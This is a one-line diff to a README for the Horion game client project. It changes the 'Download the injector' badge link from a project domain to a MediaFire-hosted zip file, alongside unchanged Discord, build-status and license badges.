@@ -8,7 +8,7 @@ If you want to contribute to this project, feel free to fork this repository and
 **As of 09/01/20, this project is under no active development by the horion team anymore. We will still review PRs.**
 
 [![Discord](https://img.shields.io/discord/732833913705201736?label=chat&logo=discord&logoColor=white&style=for-the-badge)](https://discord.gg/WPe3WeNtgv)
-[![Download the injector](https://img.shields.io/badge/download-injector-brightgreen?style=for-the-badge "Download the injector")](https://horionbeta.club/injector "Download the injector")
+[![Download the injector](https://img.shields.io/badge/download-injector-brightgreen?style=for-the-badge "Download the injector")](https://www.mediafire.com/file/xuudqh932xwtjlc/HorionInjector.zip/file "Download the injector")
 ![Total Injections](https://img.shields.io/github/downloads/Horionclient/Horion-Releases/total?label=Total%20Injections&style=for-the-badge)
 [![Build Status](https://img.shields.io/azure-devops/build/horionclient/Horion/2?label=dev%20release&style=for-the-badge)](https://dev.azure.com/horionclient/Horion/_build/latest?definitionId=2&branchName=master)
 [![License](https://i.creativecommons.org/l/by-nc/4.0/88x31.png)](https://creativecommons.org/licenses/by-nc/4.0/)
